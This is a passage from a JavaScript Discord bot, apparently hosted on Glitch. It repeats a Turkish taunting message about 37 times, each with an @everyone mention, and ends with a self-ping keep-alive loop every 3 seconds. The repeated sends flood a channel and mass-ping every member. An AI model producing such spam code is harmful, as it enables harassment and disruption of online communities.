        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``'); 
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
        msg.channel.send('**__Siz Bir Şeymi Demiştiniz Kankiler Duyamadım!? :D__** ||@everyone|| ``😁``');
  }
});


const http = require("http");
const express = require("express");
const app = express();
    function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) { 
    if ((new Date().getTime() - start) > milliseconds){         /// 7-24 Açık Kalmasını Sağlayan Komuttur. Hiçbirşeyi Oynamayın.
      break;
    }
  }    
}
app.get("/", (request, response) => {
  console.log(Date.now() + " Ping tamamdır.");  
  response.sendStatus(200);
});
app.listen(process.env.PORT);
setInterval(() => {
  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);   /// 7-24 Açık Kalmasını Sağlayan Komuttur. Hiçbirşeyi Oynamayın.
}, 3000);


